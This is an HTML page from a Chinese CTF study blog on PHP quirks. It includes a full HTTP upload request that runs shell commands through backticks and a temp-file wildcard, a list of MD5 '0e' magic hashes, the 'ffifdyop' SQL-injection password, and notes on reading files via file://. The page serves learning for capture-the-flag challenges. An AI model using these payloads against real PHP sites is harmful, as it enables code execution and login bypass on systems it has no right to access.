@@ -1,0 +1,391 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHP特性 | Hexo</title><meta name="author" content="Neo"><meta name="copyright" content="Neo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="命令执行常用函数12345678print_r(); 	&#x2F;&#x2F;函数用于打印变量，以更容易理解的形式展示。			&#x2F;&#x2F;PHP 版本要求: PHP 4, PHP 5, PHP 7highlight_file(); &#x2F;&#x2F;函数对文件进行 PHP 语法高亮显示。show_source(); &#x2F;&#x2F;show_source函数是highlight_file()函数的别名scandir(); 	&#x2F;&#x2F;函数返回指定目录中的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP特性">
+<meta property="og:url" content="http://example.com/2024/10/24/PHP%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="命令执行常用函数12345678print_r(); 	&#x2F;&#x2F;函数用于打印变量，以更容易理解的形式展示。			&#x2F;&#x2F;PHP 版本要求: PHP 4, PHP 5, PHP 7highlight_file(); &#x2F;&#x2F;函数对文件进行 PHP 语法高亮显示。show_source(); &#x2F;&#x2F;show_source函数是highlight_file()函数的别名scandir(); 	&#x2F;&#x2F;函数返回指定目录中的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2024-10-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-24T09:13:22.877Z">
+<meta property="article:author" content="Neo">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><link rel="shortcut icon" href="/img/logo.jpg"><link rel="canonical" href="http://example.com/2024/10/24/PHP%E7%89%B9%E6%80%A7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        if (name && globalFn[key][name]) return
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PHP特性',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-24 17:13:22'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Hexo</span></a><a class="nav-page-title" href="/"><span class="site-name">PHP特性</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PHP特性</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-23T16:00:00.000Z" title="发表于 2024-10-24 00:00:00">2024-10-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-24T09:13:22.877Z" title="更新于 2024-10-24 17:13:22">2024-10-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Learn/">Learn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Learn/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(); 	<span class="comment">//函数用于打印变量，以更容易理解的形式展示。</span></span><br><span class="line">			<span class="comment">//PHP 版本要求: PHP 4, PHP 5, PHP 7</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(); <span class="comment">//函数对文件进行 PHP 语法高亮显示。</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(); <span class="comment">//show_source函数是highlight_file()函数的别名</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>(); 	<span class="comment">//函数返回指定目录中的文件和目录的数组。</span></span><br><span class="line">			<span class="comment">//例如scandir(&quot;.&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">glob</span>();		<span class="comment">//函数返回一个包含匹配指定模式的文件名或目录的数组。</span></span><br><span class="line">			<span class="comment">//该函数返回一个包含有匹配文件/目录的数组。如果失败则返回 FALSE。</span></span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h3 id="仅能使用p"><a href="#仅能使用p" class="headerlink" title="仅能使用p &#96; ? &#x2F; + &lt; &gt; &#x3D;"></a>仅能使用p &#96; ? &#x2F; + &lt; &gt; &#x3D;</h3><h4 id="长短标签"><a href="#长短标签" class="headerlink" title="长短标签"></a>长短标签</h4><?= $cmd ?><p> 等于 <?php echo($cmd) ?><br>在php中，<? ?>称为短标签，<?php ?>称为长标签。修改PHP.ini文件配置 short_open_tag &#x3D; On 才可使用短标签。php5.4.0以后， &lt;?&#x3D; 总是可代替 &lt;? echo。</p>
+<h4 id="反引号-（键盘Tab键上面那个键）"><a href="#反引号-（键盘Tab键上面那个键）" class="headerlink" title="反引号&#96;&#96;（键盘Tab键上面那个键）"></a>反引号&#96;&#96;（键盘Tab键上面那个键）</h4><p>在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错。如下语句可得系统日期:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> `data` <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="点"><a href="#点" class="headerlink" title="点 ."></a>点 .</h4><p>点命令等于source命令，用来执行文件。</p>
+<p>source &#x2F;home&#x2F;user&#x2F;bash  等同于  . &#x2F;home&#x2F;user&#x2F;bash</p>
+<h4 id="加号"><a href="#加号" class="headerlink" title="加号 +"></a>加号 +</h4><p>URL编码中空格为%20，+表示为%2B。然而url中+也可以表示空格，要表示+号必须得用%2B。</p>
+<h4 id="p-p-p"><a href="#p-p-p" class="headerlink" title="&#x2F;??p&#x2F;p?p??????"></a>&#x2F;??p&#x2F;p?p??????</h4><h5 id="临时文件夹目录"><a href="#临时文件夹目录" class="headerlink" title="临时文件夹目录"></a>临时文件夹目录</h5><p>php上传文件后会将文件存储在临时文件夹，然后用move_uploaded_file() 函数将上传的文件移动到新位置。临时文件夹可通过php.ini的upload_tmp_dir 指定，默认是&#x2F;tmp目录。</p>
+<h5 id="临时文件命名规则"><a href="#临时文件命名规则" class="headerlink" title="临时文件命名规则"></a>临时文件命名规则</h5><p>默认为 php+4或者6位随机数字和大小写字母，在windows下有tmp后缀，linux没有。比如windows下：phpXXXXXX.tmp linux下：phpXXXXXX。</p>
+<h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><p>问号?代表一个任意字符，通配符&#x2F;??p&#x2F;p?p??????匹配&#x2F;tmp&#x2F;phpxxxxxx</p>
+<h4 id="使用burpsuite上传文件"><a href="#使用burpsuite上传文件" class="headerlink" title="使用burpsuite上传文件"></a>使用burpsuite上传文件</h4><p>用burpsuite发送POST请求，上传文件。（注意：Content-Length下必须空一行）</p>
+<h5 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type有两个值：	①application/x-www-form-urlencoded(默认值) ：上传键值对</span><br><span class="line">						②multipart/form-data：上传文件</span><br></pre></td></tr></table></figure>
+
+<h5 id="boundary"><a href="#boundary" class="headerlink" title="boundary"></a>boundary</h5><pre><code>boundary为边界分隔符
+
+文件开始标记：-----------------------------10242300956292313528205888
+
+文件结束标记：-----------------------------10242300956292313528205888--
+
+其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。
+</code></pre>
+<h5 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h5><p>#! &#x2F;bin&#x2F;sh 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：sh,csh,ksh,tcsh。首先用命令ls &#x2F;  来查看服务器根目录有哪些文件，发现有flag.txt，然后再用cat &#x2F;flag.txt 即可。</p>
+<h4 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br><span class="line">Host: bcb5cac6-1033-4f9b-89a0-e618dcbfc700.challenge.ctf.show</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line">Content-Length: 230</span><br><span class="line"></span><br><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">#! /bin/bash</span><br><span class="line"></span><br><span class="line">cat /flag.txt</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h2><h3 id="MD5相等绕过"><a href="#MD5相等绕过" class="headerlink" title="MD5相等绕过"></a>MD5相等绕过</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，PHP会当作<strong>科学计数法</strong>来处理，也就是0的n次方，得到的值比较的时候都相同。</p>
+<p><strong>这种方式只有在弱比较的时候才能使用。</strong></p>
+<h4 id="MD5值以0E开头的数据"><a href="#MD5值以0E开头的数据" class="headerlink" title="MD5值以0E开头的数据"></a>MD5值以0E开头的数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">240610708 </span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">314282422 </span><br><span class="line">0e990995504821699494520356953734</span><br><span class="line">571579406 </span><br><span class="line">0e972379832854295224118025748221</span><br><span class="line">903251147 </span><br><span class="line">0e174510503823932942361353209384</span><br><span class="line">1110242161 </span><br><span class="line">0e435874558488625891324861198103</span><br><span class="line">1320830526 </span><br><span class="line">0e912095958985483346995414060832</span><br><span class="line">1586264293 </span><br><span class="line">0e622743671155995737639662718498</span><br><span class="line">2302756269 </span><br><span class="line">0e250566888497473798724426794462</span><br><span class="line">2427435592 </span><br><span class="line">0e067696952328669732475498472343</span><br><span class="line">2653531602 </span><br><span class="line">0e877487522341544758028810610885</span><br><span class="line">3293867441 </span><br><span class="line">0e471001201303602543921144570260</span><br><span class="line">3295421201 </span><br><span class="line">0e703870333002232681239618856220</span><br><span class="line">3465814713 </span><br><span class="line">0e258631645650999664521705537122</span><br><span class="line">3524854780 </span><br><span class="line">0e507419062489887827087815735195</span><br><span class="line">3908336290 </span><br><span class="line">0e807624498959190415881248245271</span><br><span class="line">4011627063 </span><br><span class="line">0e485805687034439905938362701775</span><br><span class="line">4775635065 </span><br><span class="line">0e998212089946640967599450361168</span><br><span class="line">4790555361 </span><br><span class="line">0e643442214660994430134492464512</span><br><span class="line">5432453531 </span><br><span class="line">0e512318699085881630861890526097</span><br><span class="line">5579679820 </span><br><span class="line">0e877622011730221803461740184915</span><br><span class="line">5585393579 </span><br><span class="line">0e664357355382305805992765337023</span><br><span class="line">6376552501 </span><br><span class="line">0e165886706997482187870215578015</span><br><span class="line">7124129977 </span><br><span class="line">0e500007361044747804682122060876</span><br><span class="line">7197546197 </span><br><span class="line">0e915188576072469101457315675502</span><br><span class="line">7656486157 </span><br><span class="line">0e451569119711843337267091732412</span><br><span class="line">QLTHNDT </span><br><span class="line">0e405967825401955372549139051580</span><br><span class="line">QNKCDZO </span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">EEIZDOI </span><br><span class="line">0e782601363539291779881938479162</span><br><span class="line">TUFEPMC </span><br><span class="line">0e839407194569345277863905212547</span><br><span class="line">UTIPEZQ </span><br><span class="line">0e382098788231234954670291303879</span><br><span class="line">UYXFLOI </span><br><span class="line">0e552539585246568817348686838809</span><br><span class="line">IHKFRNS </span><br><span class="line">0e256160682445802696926137988570</span><br><span class="line">PJNPDWY </span><br><span class="line">0e291529052894702774557631701704</span><br><span class="line">ABJIHVY </span><br><span class="line">0e755264355178451322893275696586</span><br><span class="line">DQWRASX </span><br><span class="line">0e742373665639232907775599582643</span><br><span class="line">DYAXWCA </span><br><span class="line">0e424759758842488633464374063001</span><br><span class="line">GEGHBXL </span><br><span class="line">0e248776895502908863709684713578</span><br><span class="line">GGHMVOE </span><br><span class="line">0e362766013028313274586933780773</span><br><span class="line">GZECLQZ </span><br><span class="line">0e537612333747236407713628225676</span><br><span class="line">NWWKITQ </span><br><span class="line">0e763082070976038347657360817689</span><br><span class="line">NOOPCJF </span><br><span class="line">0e818888003657176127862245791911</span><br><span class="line">MAUXXQC </span><br><span class="line">0e478478466848439040434801845361</span><br><span class="line">MMHUWUV </span><br><span class="line">0e701732711630150438129209816536</span><br></pre></td></tr></table></figure>
+
+<h3 id="MD5数组绕过"><a href="#MD5数组绕过" class="headerlink" title="MD5数组绕过"></a>MD5数组绕过</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 <code>==</code> 和 <code>===</code> 比较的结果均为 True</p>
+<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="与数据库结合"><a href="#与数据库结合" class="headerlink" title="与数据库结合"></a>与数据库结合</h2><h3 id="password-md5-pass-true-绕过"><a href="#password-md5-pass-true-绕过" class="headerlink" title="$password&#x3D;md5($pass,true)绕过"></a>$password&#x3D;md5($pass,true)绕过</h3><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>
+
+<h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>md5()函数会将我们输入的值，加密，然后转换成16字符的二进制格式，由于<code>ffifdyop</code>被md5加密后的<strong>276f722736c95d99e921722cf9ed621c</strong>转换成16位原始二进制格式为**’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c<strong>，这个字符串前几位刚好是</strong>‘ or ‘6。**</p>
+<p>在MySQL内，用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password&#x3D;’ or ‘1xxxx’，那么就相当于password&#x3D;’ or 1，所以返回值就是true。</p>
+<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> 协议</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照PHP语法进行解析，这是<code>include()</code>函数所决定的。</p>
+<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>file:&#x2F;&#x2F;[文件的绝对路径和文件名]</p>
